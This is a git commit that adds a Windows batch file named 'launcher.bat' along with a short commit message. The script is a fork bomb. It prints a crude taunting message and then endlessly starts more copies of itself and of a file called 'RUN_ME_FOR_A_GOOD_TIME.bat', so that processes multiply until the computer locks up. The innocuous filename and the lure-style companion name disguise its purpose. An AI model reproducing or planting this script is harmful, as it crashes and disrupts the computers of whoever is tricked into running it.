f581ab05d7ce9452899d03e3f7341199911d0a15
NicoAICP <nicohaberkorn@gmx.de>
2017-12-23 19:15:39 +0100

    Create launcher.bat

---
+++ launcher.bat
@@ -0,0 +1,27 @@
+:BEGIN
+ECHO Your Windows Device has just been analy violated by Eix, Have a nice day!
+@ECHO off
+Pushd "%~dp0"
+title Eix%random%
+timeout /t 1 /nobreak >nul
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+GOTO BEGIN
